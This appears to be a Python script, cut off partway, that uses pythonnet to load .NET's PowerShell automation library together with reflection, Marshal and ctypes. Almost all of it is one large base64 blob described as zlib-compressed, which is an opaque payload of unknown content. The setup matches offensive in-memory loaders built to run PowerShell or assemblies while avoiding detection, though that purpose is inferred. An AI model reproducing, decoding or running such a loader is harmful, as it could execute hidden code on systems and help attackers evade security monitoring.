import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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